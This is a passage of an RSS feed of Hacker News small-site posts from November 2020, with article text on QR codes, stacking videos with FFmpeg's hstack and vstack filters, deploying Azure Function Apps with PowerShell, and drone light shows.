<p><img src="https://blog.snappymob.com/hs-fs/hubfs/grabpayshopeepay.jpg?width=648&amp;name=grabpayshopeepay.jpg" alt="grabpay, shopeepay, qr code, merchant, scan to pay, app" width="648" srcset="https://blog.snappymob.com/hs-fs/hubfs/grabpayshopeepay.jpg?width=324&amp;name=grabpayshopeepay.jpg 324w, https://blog.snappymob.com/hs-fs/hubfs/grabpayshopeepay.jpg?width=648&amp;name=grabpayshopeepay.jpg 648w, https://blog.snappymob.com/hs-fs/hubfs/grabpayshopeepay.jpg?width=972&amp;name=grabpayshopeepay.jpg 972w, https://blog.snappymob.com/hs-fs/hubfs/grabpayshopeepay.jpg?width=1296&amp;name=grabpayshopeepay.jpg 1296w, https://blog.snappymob.com/hs-fs/hubfs/grabpayshopeepay.jpg?width=1620&amp;name=grabpayshopeepay.jpg 1620w, https://blog.snappymob.com/hs-fs/hubfs/grabpayshopeepay.jpg?width=1944&amp;name=grabpayshopeepay.jpg 1944w" sizes="(max-width: 648px) 100vw, 648px"><br>(Image Source: help.shopee.com.my, grab.com)</p>
<h4><strong>Email and Direct Messaging</strong></h4>
<p>You can embed URL links that lead straight to a ‘compose email’ or ‘compose direct message’ page (for instance, <a href="mailto:hello@snappymob.com">mailto:hello@snappymob.com</a>) into your QR code. For email, this saves your customers up to 10 seconds because it helps them skip the process of opening their email app, tapping on compose email, and typing your email address manually into the recipient bar. For social media, this saves them the effort of opening the app, typing your username into the search bar, and tapping on the message button. This might literally be “a matter of seconds” which seems small, but it keeps people who are interested in your services or products, well, interested. Making things quicker and easier for your patrons is always a good move.</p></span></p><p><label>app insights</label></p>
        
      </div></div>]]>
            </description>
            <link>https://blog.snappymob.com/qr-codes-arent-actually-magic</link>
            <guid isPermaLink="false">hacker-news-small-sites-25022738</guid>
            <pubDate>Sun, 08 Nov 2020 03:48:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why you should stop using Google Alerts]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25022723">thread link</a>) | @fstopmick
<br/>
November 7, 2020 | https://www.karma.fm/p/0SZfbtW/why-you-should-stop-using-google-alerts | <a href="https://web.archive.org/web/*/https://www.karma.fm/p/0SZfbtW/why-you-should-stop-using-google-alerts">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="report-contribution-modal" tabindex="-1" role="dialog">
    <div role="document">
        <div>
            

            <div>
                <div>
                    <p>
                        Report a violation of our TBD:
                    </p>

                    <dl>
                        <dt><label for="exclude-links">Dead Link:</label></dt>
                        <dd></dd>
                        <dt><label for="exclude-links">Jerk Vibes:</label></dt>
                        <dd></dd>
                        <dt><label for="exclude-links">Copyright Infringement:</label></dt>
                        <dd></dd>
                        <dt><label for="exclude-links">PII:</label></dt>
                        <dd></dd>
                        <dt><label for="exclude-links">Other:</label></dt>
                        <dd></dd>
                    </dl>

                    </div>
            </div>
        </div>
    </div>
</div></div>]]>
            </description>
            <link>https://www.karma.fm/p/0SZfbtW/why-you-should-stop-using-google-alerts</link>
            <guid isPermaLink="false">hacker-news-small-sites-25022723</guid>
            <pubDate>Sun, 08 Nov 2020 03:45:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Stack Videos Horizontally, Vertically, in a Grid With FFmpeg]]>
            </title>
            <description>
<![CDATA[
Score 215 | Comments 43 (<a href="https://news.ycombinator.com/item?id=25022665">thread link</a>) | @rrao84
<br/>
November 7, 2020 | https://ottverse.com/stack-videos-horizontally-vertically-grid-with-ffmpeg/ | <a href="https://web.archive.org/web/*/https://ottverse.com/stack-videos-horizontally-vertically-grid-with-ffmpeg/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<figure>
<img src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/11/stacking-videos.png?resize=678%2C381&amp;ssl=1" alt="stack videos using ffmpeg" title="stacking-videos" data-src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/11/stacking-videos.png?resize=678%2C381&amp;ssl=1" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
</figure>


<p>Often times, when you want to compare two videos side-by-side or you want to create an effect during post-processing, you might want to stack videos together. It can get expensive if you end up buying a tool to do this, but, guess what? </p>



<p><strong>FFmpeg offers a variety of tools to help stack videos together – horizontally, vertically, or in a grid fashion. In this tutorial, let’s learn about FFmpeg’s <code>hstack</code> and <code>vstack</code> filters for stacking videos. </strong></p>



<hr>




<h2><span id="How_to_Stack_Videos_Horizontally_using_FFmpeg"></span><strong>How to Stack Videos Horizontally using FFmpeg?</strong><span></span></h2>



<p>“Horizontally stacking videos” refers to placing videos side-by-side (one on the left and the other on the right). </p>



<p>Before you do this, there are a couple of points that you need to consider. </p>



<ol><li>The videos that you want to stack need to have the same height. </li><li> The videos need to have the same pixel format. </li></ol>



<p>The command line is shown below where we try and stack two <code>mp4</code> videos. </p>



<pre><code>ffmpeg -i input0.mp4 -i input1.mp4&nbsp;-filter_complex hstack=inputs=2 horizontal-stacked-output.mp4</code></pre>



<p>The <code>hstack</code> filter has a simple format. You need to specify the number of inputs and it parses that from the beginning portion of the commandline. The order of stacking follows the order of inputs. </p>



<p>Here is a screenshot of what it looks like. </p>



<figure><img src="https://lh6.googleusercontent.com/4FwbqByqDpDpOGTNvpSWSOh6RVE9yzesrQyAyGvaOF1ZjVsycKOlQUjrTmdJRFJWblHjC9gF6zMds0s5w2Yy2w6CVXXme-H-zF8nYoJ496khN0aHXHaWbnwEe41BYmu6c2mdoQb8" alt="stack videos using ffmpeg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>



<p>And, here is a video! </p>



<p><iframe frameborder="0" allow="autoplay; fullscreen" allowfullscreen="" data-src="https://player.vimeo.com/video/475731721" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></iframe></p>







<p>Here is another use case. Companies or teams working on video compression often like to compare videos side-by-side in the lab or showcase their work in conferences. FFmpeg’s horizontal stacking is an easy way to do this and achieve a very good result. </p>



<p>Below are two videos encoded at different video quality settings and stacked horizontally. Comparison made simple, right? <em>(note: Vimeo’s choise of bitrate might mess with the comparison, but, when done offline (downloaded), the <code>hstack</code> filter makes comparisons easy!)</em></p>



<p><iframe frameborder="0" allow="autoplay; fullscreen" allowfullscreen="" data-src="https://player.vimeo.com/video/476095363" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></iframe></p>



<hr>



<h2><span id="Stacking_Videos_Vertically_using_FFmpeg"></span><strong>Stacking Videos Vertically using FFmpeg</strong><span></span></h2>



<p>“Vertically stacked videos” results in placing videos one below the other. Unlike in horizontal stacking, inputs need to be having the same width. The command is as shown.&nbsp;</p>



<p>For vertical stacking, we need to use the <code>vstack</code> filter whose syntax is similar to the <code>hstack</code> filter we used in the previous horizontal stacking example.</p>



<pre><code>ffmpeg -i input0.mp4 -i input1.mp4&nbsp;-filter_complex vstack=inputs=2 vertical-stack-output.mp4</code></pre>



<figure><img src="https://lh5.googleusercontent.com/qtyxioWFR54pqwZhX7jgX6HkSG7gCw840GdK78HGHHP7X3sv3fr3Pou9hOMFu2O-e6O7nmCith3U6CM1SpDanhwmIFIBzZUQyaG4T0BJaF9QCdMIPrmMmH0qc9WTK5f-5Nf4-92y" alt="stack videos using ffmpeg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>



<p>Both functions pretty much use the same commands with a simple distinction, the <a href="https://ffmpeg.org/ffmpeg-filters.html#hstack" target="_blank" rel="noopener"><code>hstack</code></a> and the <a href="https://ffmpeg.org/ffmpeg-filters.html#vstack" target="_blank" rel="noopener"><code>vstack</code></a> under the <code>-filter_complex</code> argument.&nbsp;</p>



<p>Here’s a video of stacking two videos vertically using FFmpeg. </p>



<p><iframe frameborder="0" allow="autoplay; fullscreen" allowfullscreen="" data-src="https://player.vimeo.com/video/475731607" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></iframe></p>



<hr>



<h2><span id="Stacking_Videos_of_Different_Lengths"></span><strong>Stacking Videos of Different Lengths</strong><span></span></h2>



<p>Well, there’s a really nifty ability for both of these to prioritize the length of the shortest video. And as luck would have it the parameter is named <code>shortest</code>, and it’s applicable to both the horizontal and vertical stacking filters. Using <code>shortest=1</code> ensures the shortest length is used. </p>



<p>For example – </p>



<pre><code>ffmpeg -i input0.mp4 -i input1.mp4 -filter_complex hstack=inputs=2:shortest=1 shortest-output.mp4</code></pre>



<p>As a <b>side note</b>, if you run into an error that claims frames are being duplicated, the easiest workaround is to slip the <code>vsync 2</code> parameter into your command, and it worked like a charm.</p>



<h3><span id="Stacking_Videos_of_Different_Lengths_Without_the_shortest_parameter"></span>Stacking Videos of Different Lengths Without the <code>shortest</code> parameter<span></span></h3>



<p>To test what happens in this situation, let’s stack two videos vertically – a 10 second clip and an 18 second clip. You’ll see that the shorter clip just stops after it completes, but the output video continues till the longest of the input clips complete.  </p>



<p><iframe frameborder="0" allow="autoplay; fullscreen" allowfullscreen="" data-src="https://player.vimeo.com/video/475731684" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></iframe></p>











<p>If you want to truncate the clips to the length of the shortest clip, then you need to use the <code>shortest=1</code> parameter. Let’s look at that in the next section.</p>



<h3><span id="Stacking_Videos_of_Different_Lengths_With_the_shortest=1_parameter"></span>Stacking Videos of Different Lengths With the <code>shortest=1</code> parameter<span></span></h3>



<p>In this example, we use the <code>shortest=1</code> command-line parameter and as you can see, the length of the final video is truncated to the length of the shortest of the inputs. </p>



<p><iframe frameborder="0" allow="autoplay; fullscreen" allowfullscreen="" data-src="https://player.vimeo.com/video/475731643" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></iframe></p>



<hr>



<h2><span id="2%C3%972_Grid_of_Videos_using_FFmpeg"></span><strong><strong>2×2 Grid of Videos using FFmpeg</strong></strong><span></span></h2>



<p>We can achieve a 2×2 grid of videos using a combination of the <code>hstack</code> and <code>vstack</code> filters. Let’s start by looking at the command-line and then break it down. It’s actually pretty simple! </p>



<pre><code>ffmpeg \
-i input0.mp4 -i input1.mp4 -i input2.mp4 -i input3.mp4 \
-filter_complex \
"[0:v][1:v]hstack=inputs=2[top]; \
[2:v][3:v]hstack=inputs=2[bottom]; \
[top][bottom]vstack=inputs=2[v]" \
-map "[v]" \
finalOutput.mp4</code></pre>



<p>What’s happening here?</p>



<ul><li>firstly, you need to provide 4 input videos with the same height and width</li><li>next, you stack the first two videos horizontally and call it “top” i.e. <code>[0:v][1:v]hstack=inputs=2[top]</code></li><li>then, you you stack the next two videos horizontally and call it “bottom” i.e. <code>[2:v][3:v]hstack=inputs=2[bottom]</code></li><li>then, you stack <code>top</code> and <code>bottom</code> vertically to create a 2×2 grid. — <code>[top][bottom]vstack=inputs=2[v]</code></li><li>then using the <code>map</code> command, we can extract and push the video track to the output container. </li></ul>



<p>Here is what the video looks like. </p>



<p><iframe frameborder="0" allow="autoplay; fullscreen" allowfullscreen="" data-src="https://player.vimeo.com/video/475771172" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></iframe></p>



<hr>



<h2><span id="3%C3%972_Grid_of_Videos_using_FFmpeg"></span><strong>3×2 Grid of Videos using FFmpeg</strong><span></span></h2>



<p>Along the same lines, here is a 3×2 grid of videos using <code>hstack</code> and <code>vstack</code> filters. </p>



<pre><code>ffmpeg \
-i input0.mp4 -i input1.mp4 \
-i input2.mp4 -i input3.mp4 \
-i input4.mp4 -i input5.mp4 \
-filter_complex \
"[0:v][1:v][2:v]hstack=inputs=3[top];\
[3:v][4:v][5:v]hstack=inputs=3[bottom];\
[top][bottom]vstack=inputs=2[v]" \
-map "[v]" \
finalOutput.mp4</code></pre>



<p><iframe frameborder="0" allow="autoplay; fullscreen" allowfullscreen="" data-src="https://player.vimeo.com/video/475780643" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></iframe></p>



<hr>



<h2><span id="Conclusion"></span>Conclusion<span></span></h2>



<p>That’s it folks. Now you know how to stack videos together horizontally, vertically, and in a grid. This is very useful in comparing videos and also creating fun effects along the way! </p>



<p>If you enjoyed this post, do check out the rest of<a href="https://ottverse.com/category/ffmpeg/"> <strong>OTTVerse’s FFmpeg tutorials</strong></a> to learn more about this amazing media editing and compression software!  </p>

	</div></div>]]>
            </description>
            <link>https://ottverse.com/stack-videos-horizontally-vertically-grid-with-ffmpeg/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25022665</guid>
            <pubDate>Sun, 08 Nov 2020 03:36:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Deploy Azure Function Apps with Powershell]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25022651">thread link</a>) | @davideguida
<br/>
November 7, 2020 | https://www.davideguida.com/how-to-deploy-azure-function-apps-with-powershell/ | <a href="https://web.archive.org/web/*/https://www.davideguida.com/how-to-deploy-azure-function-apps-with-powershell/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Hi All! Today I want to show a quick’n’dirty way to easily deploy your projects to Azure using Powershell.</p><p>I’ve been working a lot recently with Azure Functions and Web Apps. And of course, each time I’m confident with my code, I want to see it deployed on the Cloud.</p><p>Of course in an ideal world, we all would have a nice CI/CD pipeline, potentially on <a href="https://azure.microsoft.com/en-us/services/devops/?WT.mc_id=DOP-MVP-5003878" target="_blank" rel="noreferrer noopener">Azure DevOps</a>. It might happen, however, that for one reason or another, you can only get up to CI, without being able to deploy.</p><p>So the only option you have is to manually handle deployments, most likely from your local machine. But what happens if you have to deploy it to multiple destinations?</p><p>In my case, for example, I had to deploy a Function App and a Web App to multiple client subscriptions. Of course, you can always do this <a href="https://docs.microsoft.com/en-us/visualstudio/deployment/quickstart-deploy-to-azure?view=vs-2019&amp;WT.mc_id=DOP-MVP-5003878" target="_blank" rel="noreferrer noopener">directly from Visual Studio</a>, but it still feels like a lot of manual work.</p><h4>What if instead you can have a very nice script that handles all the grunt work for you?</h4><p>Moreover, you could potentially reuse it when you finally manage to get to the Continuous Deployment part.</p><p>So, the first step is to create the <a href="https://docs.microsoft.com/en-us/azure/devops/pipelines/artifacts/artifacts-overview?view=azure-devops&amp;WT.mc_id=DOP-MVP-5003878" target="_blank" rel="noreferrer noopener">Release Artifact</a>. I am assuming, of course, that you’ve ran already <a href="https://www.davideguida.com/testing-azure-functions-on-azure-devops-part-1-setup/" target="_blank" rel="noreferrer noopener">your Tests</a> and everything went fine.</p><p>My weapon of choice for these scripts today, will be Powershell:</p><pre data-enlighter-language="powershell" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">function publish{
    param(
        $projectName        
    )

    $projectPath="src/$($projectName)/$($projectName).csproj"
    $publishDestPath="publish/" + [guid]::NewGuid().ToString()

    log "publishing project '$($projectName)' in folder '$($publishDestPath)' ..." 
    dotnet publish $projectPath -c Release -o $publishDestPath

    $zipArchiveFullPath="$($publishDestPath).Zip"
    log "creating zip archive '$($zipArchiveFullPath)'"
    $compress = @{
        Path = $publishDestPath + "/*"
        CompressionLevel = "Fastest"
        DestinationPath = $zipArchiveFullPath
    }
    Compress-Archive @compress

    log "cleaning up ..."
    Remove-Item -path "$($publishDestPath)" -recurse

    return $zipArchiveFullPath
}</pre><p>Here I’m building a temporary path using a GUID and calling <em><a href="https://docs.microsoft.com/en-us/dotnet/core/tools/dotnet-publish?WT.mc_id=DOP-MVP-5003878" target="_blank" rel="noreferrer noopener">dotnet publish</a> </em>to compile the Project and output the binaries to it. Then we generate a Zip archive and get rid of the publish folder.</p><p>The <em>log </em>function is just a simple wrapper over <em>Write-Host</em>, I just added some fancy colors to highlight the text:</p><pre data-enlighter-language="powershell" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">function log{
    param(
        $text
    )

    write-host $text -ForegroundColor Yellow -BackgroundColor DarkGreen
}</pre><p>Now that we have our Artifact, the next step is to deploy it to Azure. If you, like me, are working with Azure Functions, this is the script for you:</p><pre data-enlighter-language="powershell" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">function deploy{
    param(
        $zipArchiveFullPath,
        $subscription,
        $resourceGroup,        
        $appName
    )    

    log "deploying '$($appName)' to Resource Group '$($resourceGroup)' in Subscription '$($subscription)' from zip '$($zipArchiveFullPath)' ..."
    az functionapp deployment source config-zip -g "$($resourceGroup)" -n "$($appName)" --src "$($zipArchiveFullPath)" --subscription "$($subscription)"   
}</pre><p>It simply takes the full path to the zip archive we produced before and the name of the destination Azure Subscription, Resource Group and Application. Easy peasy.</p><p>Now, I’ve found particularly handy to set some basic application settings, right after the deployment. For this, I keep a simple JSON file with key/value pairs and deploy it using this script:</p><pre data-enlighter-language="powershell" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">function setConfig{
    param(
        $subscription,
        $resourceGroup,        
        $appName,
        $configPath
    )
    log "updating application config..."
    az functionapp config appsettings set --name "$($appName)" --resource-group "$($resourceGroup)" --subscription "$($subscription)" --settings @$configPath
}</pre><p>The config file can be something like this:</p><pre data-enlighter-language="json" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">{
  "FUNCTIONS_WORKER_RUNTIME": "dotnet",  
  "ASPNETCORE_ENVIRONMENT": "DEV",
  "Foo": "bar"
}
</pre><p>The last step is to put everything together and call it. I would suggest to create a separate script with all the previous functions. We can use it as a “library” and if we’re lucky enough, it won’t even change much when we move to CD.</p><p>For our <em>local</em> deployment script we will instead need two more helper function. The first one will take care of the Artifact:</p><pre data-enlighter-language="powershell" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">function createArtifact {
    param(
        $appName
    )
    $zipPath = publish $appName
    if ($zipPath -is [array]) {
        $zipPath = $zipPath[$zipPath.Length - 1]
    }
    return $zipPath
}</pre><p>We can’t unfortunately call directly the <em>publish </em>function because seems that the output from the <em>dotnet publish</em> command will mess a bit with the return value. So we’ll need to do some magic tricks, but not that much.</p><p>Then we can send the artifact to the cloud:</p><pre data-enlighter-language="powershell" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">function deployInstance {
    param(      
        $zipPath,  
        $subscription,
        $resourceGroup,        
        $appName,
        $configPath
    )

    deploy $zipPath $subscription $resourceGroup $appName

    if(![string]::IsNullOrEmpty($configPath)){
        setConfig $subscription $resourceGroup $appName $configPath
    }
}</pre><p>If you remember, at the top of the post I said that we might have to deploy the same artifact to multiple destination. Now that we have everything in place, all we have to do is just put the pieces together:</p><pre data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">$zipPath = createArtifact "MyAwesomeProject" 
deployInstance $zipPath "MyFirstSubscription" "MyFirstResourceGroup" "MyAwesomeProject1" "DEV.settings.json"
deployInstance $zipPath "MySecondSubscription" "MySecondResourceGroup" "MyAwesomeProject2" "DEV.settings.json"
deployInstance $zipPath "MyThirdSubscription" "MyThirdResourceGroup" "MyAwesomeProject3" "DEV.settings.json"</pre><p>…and so on and so forth. I think you got the idea.</p></div></div>]]>
            </description>
            <link>https://www.davideguida.com/how-to-deploy-azure-function-apps-with-powershell/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25022651</guid>
            <pubDate>Sun, 08 Nov 2020 03:32:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Everything you wanted to know about drone light shows]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25022274">thread link</a>) | @zuhayeer
<br/>
November 7, 2020 | https://verge.aero/everything-about-drone-light-shows/ | <a href="https://web.archive.org/web/*/https://verge.aero/everything-about-drone-light-shows/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text">
	
<figure><img loading="lazy" width="2000" height="1126" src="https://verge.aero/wp-content/uploads/2020/05/1_jWBjNhkYW18BwHjpukUUzQ.jpeg" alt="Philadelphia Drone Light Show" srcset="https://verge.aero/wp-content/uploads/2020/05/1_jWBjNhkYW18BwHjpukUUzQ.jpeg 2000w, https://verge.aero/wp-content/uploads/2020/05/1_jWBjNhkYW18BwHjpukUUzQ-300x169.jpeg 300w, https://verge.aero/wp-content/uploads/2020/05/1_jWBjNhkYW18BwHjpukUUzQ-768x432.jpeg 768w, https://verge.aero/wp-content/uploads/2020/05/1_jWBjNhkYW18BwHjpukUUzQ-1536x865.jpeg 1536w" sizes="(max-width: 2000px) 100vw, 2000px"><figcaption>Verge Aero flying over Franklin field for Philadelphia Drone Light Show</figcaption></figure>



<p>“Amazing”, “Beautiful”, “Incredible”, “Unreal”, “Brought tears to my eyes”.</p>



<p>These are all comments that repeatedly appeared in response to a viral Facebook video of a drone light show that <a href="https://verge.aero/">Verge Aero</a> flew to show gratitude for healthcare and essential workers in Philadelphia. The response was overwhelming, and these words demonstrate that when properly executed, drone light shows are a mesmerizing and powerful experience. Since then, we’ve received many questions about our technology, and we’d like to share our responses with a wider audience.</p>



<iframe src="https://player.vimeo.com/video/415494003" width="640" height="360" frameborder="0" allow="autoplay; fullscreen" allowfullscreen=""></iframe>



<h2><strong>What is a drone light show, exactly?</strong></h2>



<p>Drone light shows are performed by illuminated, synchronized, and choreographed groups of drones that arrange themselves into various aerial formations. Almost any image can be recreated in the sky by a computer program that turns graphics into flight commands and communicates them to the drones.</p>



<p>In recent years, drone shows have migrated from the university laboratory to being deployed at scale on prominent events around the world. We were originally inspired by this 2012 <a href="https://www.ted.com/talks/vijay_kumar_robots_that_fly_and_cooperate">TED video</a> featuring the University of Pennsylvania’s Dean of Engineering, Vijay Kumar, demonstrating drone fleets doing all kinds of stunning maneuvers. Later, pioneering work was done in Europe by the <a href="https://www.spaxels.at/">Spaxels Research Initiative</a>, <a href="https://collmot.com/">Collmot</a>, and <a href="http://www.veritystudios.com/">Verity</a>.<a href="https://www.intel.com/"> Intel</a> has done the most to popularize the concept, flying drone shows on big events such as the Super Bowl halftime show and the Winter Olympics.</p>



<figure><img loading="lazy" width="1000" height="562" src="https://verge.aero/wp-content/uploads/2020/05/1_xIWK_MTjYpP_xFAK9zP8gg.jpeg" alt="Philadelphia Drone Light Show LOVE" srcset="https://verge.aero/wp-content/uploads/2020/05/1_xIWK_MTjYpP_xFAK9zP8gg.jpeg 1000w, https://verge.aero/wp-content/uploads/2020/05/1_xIWK_MTjYpP_xFAK9zP8gg-300x169.jpeg 300w, https://verge.aero/wp-content/uploads/2020/05/1_xIWK_MTjYpP_xFAK9zP8gg-768x432.jpeg 768w" sizes="(max-width: 1000px) 100vw, 1000px"><figcaption>First Responders filming LOVE during Philadelphia Drone Light Show</figcaption></figure>



<h2><strong>How do drone shows work?</strong></h2>



<p>Let’s clear up one thing first: drone light shows are <strong>not </strong>powered by <a href="https://en.wikipedia.org/wiki/Skynet_%28Terminator%29">Skynet</a>, the artificial intelligence network depicted in <em>The Terminator</em>! Drones used in shows are not self-aware, can’t think for themselves, and make no real-time decisions. Instead, like obedient servants, they follow specific commands sent to them and can’t deviate!</p>



<p>The process for creating a show is quite straightforward. First, the design team creates a storyboard timeline showing the desired images and effects. These looks are then animated in a specialized piece of software that translates them into synchronized flight paths for each drone, and usually a soundtrack is created to accompany the show. Complete shows are sent to the drones via radio signal from a ground control station operated by a pilot. When the pilot is satisfied that everything is safe and ready to go, the show starts, and the drones take off to draw the storyboard in the sky.</p>



<figure><img loading="lazy" width="960" height="638" src="https://verge.aero/wp-content/uploads/2020/03/Mazatlan-2.jpg" alt="verge aero flying a drone light show in Mazatlan for Carnaval de Mazatlan" srcset="https://verge.aero/wp-content/uploads/2020/03/Mazatlan-2.jpg 960w, https://verge.aero/wp-content/uploads/2020/03/Mazatlan-2-300x199.jpg 300w, https://verge.aero/wp-content/uploads/2020/03/Mazatlan-2-768x510.jpg 768w" sizes="(max-width: 960px) 100vw, 960px"><figcaption>Verge Aero flies a show in Mazatlan for Carnaval 2020</figcaption></figure>



<p>Creating a system that can be flown safely and repeatedly requires a lot of clever engineering work. Verge Aero’s drones and software were designed by our engineers specifically for performing shows. Our custom drones are missing some things normally found on drones, like cameras, and include unique features, such as a blindingly bright LED light source.</p>



<p>Verge Aero’s design software lets users select graphics and special effects and place them in a timeline, similar to those found in video editing software. This software calculates the flight paths of each drone to guarantee they don’t collide in the air, and generates a full 3D rendering of the show to ensure it looks exactly as intended. Every drone is sent a unique program and the ground control station monitors each drone over a local, encrypted network for maximum safety.</p>



<p>The flight crew uses a detailed dashboard display on the ground station to prepare drones for flight and continuously monitor status. The drones themselves carry multiple radios operating simultaneously, away from busy WiFi frequencies, to ensure communications are maintained even in busy and noisy radio environments.</p>



<p>Shows are flown by certified pilots, experts in relevant aviation subject matter, including regulations and weather. Prior to every show, checklists are used to make sure everything is in order: drones are fully operational, batteries are charged, and the flight area is clear. Once these checks are complete, the pilot presses <strong>GO</strong> and the drones take off on their mission!</p>



<figure><img loading="lazy" width="2700" height="1800" src="https://verge.aero/wp-content/uploads/2020/03/FIG2019-2700x1800.jpg" alt="guitar drone light show at Festival Internacional del Globo" srcset="https://verge.aero/wp-content/uploads/2020/03/FIG2019-2700x1800.jpg 2700w, https://verge.aero/wp-content/uploads/2020/03/FIG2019-300x200.jpg 300w, https://verge.aero/wp-content/uploads/2020/03/FIG2019-768x512.jpg 768w, https://verge.aero/wp-content/uploads/2020/03/FIG2019-1536x1024.jpg 1536w, https://verge.aero/wp-content/uploads/2020/03/FIG2019-2048x1365.jpg 2048w" sizes="(max-width: 2700px) 100vw, 2700px"><figcaption>Guitar in drone light show at Festival Internacional del Globo</figcaption></figure>



<h2><strong>Will drones replace fireworks?</strong></h2>



<p>Fireworks shows are increasingly criticized for their negative environmental impact—they are noisy, polluting, and wasteful. Concerns are regularly raised around their impact on sensitive wildlife populations, as well as military veterans experiencing PTSD. What’s more, in many locations, fireworks displays have been banned altogether, due to the increased risk of wildfires.</p>



<p>These and other factors have led many people to consider replacing fireworks displays with alternatives—and drone light shows are perfectly positioned to fill the gap.</p>



<div><figure><img loading="lazy" src="https://verge.aero/wp-content/uploads/2020/05/1_tWamVl5u_EH8BWg5Nmm3ZQ.jpeg" alt="Philadelphia Drone Light Show Stethoscope" width="286" height="391" srcset="https://verge.aero/wp-content/uploads/2020/05/1_tWamVl5u_EH8BWg5Nmm3ZQ.jpeg 1000w, https://verge.aero/wp-content/uploads/2020/05/1_tWamVl5u_EH8BWg5Nmm3ZQ-220x300.jpeg 220w, https://verge.aero/wp-content/uploads/2020/05/1_tWamVl5u_EH8BWg5Nmm3ZQ-768x1049.jpeg 768w" sizes="(max-width: 286px) 100vw, 286px"><figcaption>Verge Aero flies a stethoscope for frontline workers at the Hospital of the University of Pennsylvania</figcaption></figure></div>



<p>In many cases, drone shows have been used successfully as a great complement to fireworks displays. However, as a new and exciting form of entertainment, drones have much more to offer. They are capable of a far greater range of effects than fireworks, and their capacity for sophisticated choreography gives them vastly more potential for storytelling in the sky. Drones can also be deployed in more constrained environments where fireworks would never be allowed.</p>



<p>When you think about it, fireworks actually have quite a limited repertoire. Usually, a handful of effects are repeated over and over again, just in varying combinations, sizes, colors and intensities. Why settle for this when you can have dynamic, repositionable 3D pixels capable of generating virtually unlimited imagery? Drones offer far more creative options than fireworks. In fact, it’s easy to envision that as drone shows become more commonplace, people will one day look back on fireworks displays as being quite mundane in comparison.</p>



<p>Regardless, the transition from fireworks to drones will happen gradually. Fireworks shows will be with us for some time to come, if for no other reason than that they are fairly inexpensive to stage. But as drone shows become more affordable, we can expect to see events using them more frequently.</p>



<h2><strong>Why haven’t I seen more shows?</strong></h2>



<p>Even Wal-Mart now sells drones, so why aren’t we seeing more light shows? The problem is that successful show execution requires different technologies that are only now maturing. Innovations usually take time to disseminate, and drone shows are no different. A number of factors have limited the uptake of drone shows before now:</p>



<ul><li>High cost</li><li>Need for regulatory approval</li><li>Expensive and limited insurance options</li><li>Labor intensive operations</li><li>Lack of efficient show design tools</li><li>Safety requirements</li></ul>



<p>The use of specialized drones with high-precision avionics drives high cost. Labor intensive operations also contribute, whether it’s wrangling rudimentary control software or preparing finicky drones for flight.</p>



<p>High operating expenses are possibly acceptable for the Super Bowl or the Olympics, but are not viable for most events. Nonetheless, things are changing, and Verge Aero’s innovations are helping to make drone light shows more accessible to a far wider range of budgets.&nbsp;</p>



